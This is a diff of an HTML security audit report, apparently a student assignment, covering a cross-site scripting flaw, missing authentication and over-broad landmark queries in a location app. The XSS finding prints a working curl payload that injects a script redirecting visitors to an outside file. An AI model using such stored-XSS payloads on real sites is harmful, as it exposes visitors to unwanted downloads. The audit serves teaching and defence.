@@ -27,7 +27,7 @@
 <li>Issue: Cross-site scripting
 	<ul>
 	<li>Location of issue: Parsing post parameters sent to server (index.js line 90)</li>
-	<li>Severity of issue: High. May lead to issues such as downloading unwanted viral content, as shown below.</li>
+	<li>Severity of issue: High. May lead to issues such as downloading unwanted viral content, as shown below</li>
 	<li>Description of issue: The string login parameter stored in the database isn't parsed before being stored in the database, allowing for html script injections. For example, when I send the following to the server:
 		<p><pre>curl --data "login=&lt;script&gt; document.location.href = 'https://raw.githubusercontent.com/tuftsdev/comp20-jyang/master/security/examples/virus.txt?token=Ac8Ju3YoSwLSPnt2T127XWdADCoewghzks5aNFSdwA%3D%3D'; &lt;/script&gt;&amp;lat=0&amp;lng=0" https://stark-journey-75501.herokuapp.com/sendLocation</pre></p>
 	accessing <a href="https://stark-journey-75501.herokuapp.com/">https://stark-journey-75501.herokuapp.com/</a> will cause an automatic redirect to opening the file "virus.txt" in the browser. If the file was a .exe file instead, or any file that's automatically downloaded if it can't be opened in a browser window, serious harm could be caused.
@@ -81,6 +81,23 @@
 		<p>I am not mchowgrading, yet I can still see all of mchowgrading's previous checkins</p>
 	<li>Resolution: If a user is to use the server, they should be required to make an account or in some way authenicate that they are exactly that user.</li>
 	</ul>
+</li>
+<br>
+<li>
+	<ul>
+	<li>Issue: Poor programming practice
+	<ul>
+	<li>Location of issue: Returning the landmarks to the map (index.js line 114)</li>
+	<li>Severity of issue: Low-medium, because the app allows access to data that's supposed to be inaccessible, but the data itself does not contain sensitive information</li>
+	<li>Description of issue: Even though only the landmarks within a 1 mile radius of the user are intended to be shown, all of the landmarks in the database are returned and displayed on the map.
+		<p>With the way the app is set up now, the issue does not have much impact, due to the landmarks data being publicly accessible and impersonal anyway. However, if the client is only supposed to have access to certain information, showing other information is bad practice and could be harmful with more sensitive data.</p></li>
+	<li>Proof of vulnerability:</li>
+		<p><img src="examples/incorrect-map.png" alt="map of user and all surrounding landmarks" /></p>
+		<p>Landmarks from outside the 1 mile radius are displayed on the map</p>
+	<li>Resolution: Instead of finding all landmarks in the database, the 2d sphere index function needs to be used, so only the ones within a 1 mile radius of the user's coordinates and found.</li>
+	</ul>
+</li>
+</ul>
 </li>
 </ol>
 
